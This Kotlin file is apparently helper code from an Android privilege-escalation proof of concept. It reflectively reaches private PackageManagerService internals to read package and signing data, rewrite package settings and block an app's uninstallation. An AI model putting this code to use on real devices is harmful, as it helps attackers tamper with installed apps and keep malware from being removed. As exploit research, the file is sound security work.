package poc.sithi.tlpe

import android.annotation.SuppressLint

/***
 * boilerplate for reflective access to some PackageManagerService logic
 */
@SuppressLint("PrivateApi")
class RPMS {
    var mSettings: Any
    var mService: Any? = null

    init {
        val serviceManagerClass = Class.forName("android.os.ServiceManager")
        val getServiceMethod = serviceManagerClass.getMethod("getService",
            String::class.java)
        val aidl = getServiceMethod.invoke(null, "package")!!
        for (field in aidl.javaClass.declaredFields) {
            if (field.getType().getName() == "com.android.server.pm.PackageManagerService") {
                field.isAccessible = true
                mService = field.get(aidl)!!
                break
            }
        }
        val mSettingsField = mService!!.javaClass.getDeclaredField("mSettings")
        mSettingsField.isAccessible = true
        mSettings = mSettingsField.get(mService)!!
    }

    fun getPackageLPr(packageName: String?): Any {
        val m = mSettings.javaClass.getDeclaredMethod("getPackageLPr", String::class.java)
        m.isAccessible = true
        return m.invoke(mSettings, packageName)!!
    }

    fun getSharedUserLPw(userName: String): Any {
        val m = mSettings.javaClass.getDeclaredMethod(
            "getSharedUserLPw", String::class.java,
            Int::class.javaPrimitiveType, Int::class.javaPrimitiveType,
            Boolean::class.javaPrimitiveType)
        m.isAccessible = true
        return m.invoke(mSettings, userName, 0, 0, false)!!
    }

    fun getSigningDetails(setting: Any): Any {
        return setting.javaClass.getMethod("getSigningDetails").invoke(setting)!!
    }

    fun writeSettings() {
        val m = mService!!.javaClass.getDeclaredMethod(
            "writeSettings",
            Boolean::class.javaPrimitiveType
        )
        m.isAccessible = true
        m.invoke(mService, true)
    }

    fun setBlockUninstallLPw(userId: Int, packageName: String?, blockUninstall: Boolean) {
        val m = mSettings!!.javaClass.getDeclaredMethod(
            "setBlockUninstallLPw", Int::class.javaPrimitiveType,
            String::class.java, Boolean::class.javaPrimitiveType
        )
        m.isAccessible = true
        m.invoke(mSettings, userId, packageName, blockUninstall)
    }
}
